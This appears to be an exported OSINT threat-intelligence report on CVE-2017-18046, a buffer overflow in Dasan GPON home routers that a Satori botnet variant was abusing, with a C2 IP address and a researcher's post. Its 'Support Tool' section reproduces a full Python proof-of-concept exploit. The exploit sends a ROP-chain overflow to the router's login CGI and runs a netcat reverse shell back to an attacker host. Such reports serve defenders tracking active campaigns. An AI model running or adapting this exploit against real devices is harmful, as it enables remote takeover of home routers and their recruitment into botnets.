# Threat Report: 2018-02-11: OSINT - Dasan Unauthenticated Remote Code Execution - and ongoing abuse


## Key Intelligence
* Date: 2018-02-11
* Threat Level: 3 (Low)
* Tags: tlp:white, misp-galaxy:tool="Mirai", misp-galaxy:tool="Satori"

---

## Indicators of Compromise (IOCs)
### External analysis
* link: https://blogs.securiteam.com/index.php/archives/3552
* text: The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146

Dasan Networks GPON ONT WiFi Router â€œis indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. Itâ€™s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.â€

### Network activity
* ip-dst: 185.62.188.88 — C2 (download of the first stage)

### Payload delivery
* vulnerability: CVE-2017-18046

### Support Tool
* text: import sys
import socket
import json
import time
import struct
import ssl

if len(sys.argv) != 4:
    print "Use: {} ip port connectback".format(sys.argv[0])
    sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

connectback = str(sys.argv[3])

buf = 1024
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.settimeout(10)

clientsocket = ssl.wrap_socket(sock)
#clientsocket = sock
clientsocket.connect((host, port))

addr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW

# rop1
rop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0
addr_rop1 = struct.pack(">i",rop1)
#rop2
system = addr_libc + 0x0003CC9C     #system
addr_system =  struct.pack(">i",system)

# execute command
command = "nc " + connectback + " -e /bin/sh;"

payload = "A"*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command

data = "action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n".format(payload)

http_payload = """POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}""".format(len(data),data)

print http_payload

clientsocket.send(http_payload)

respond_raw = clientsocket.recv(buf).strip()

print respond_raw

respond_raw = clientsocket.recv(buf).strip()

print respond_raw
respond_raw = clientsocket.recv(buf).strip()

print respond_raw

clientsocket.close() — Proof of Concept

## Objects
### microblog — Microblog post like a Twitter tweet or a post on a Facebook wall.
* [Other] text: So a brand new satori variant is causing port 8080 spike, it is looking for this new vulnerability https://blogs.securiteam.com/index.php/archives/3552 â€¦ (CVE-2017-18046) , device affected "Dasan GPON ONT WiFi Router", new C2 is 185.62.188.88
* [Other] text: Twitter
* [External analysis] url: https://twitter.com/360Netlab/status/962521516352077824
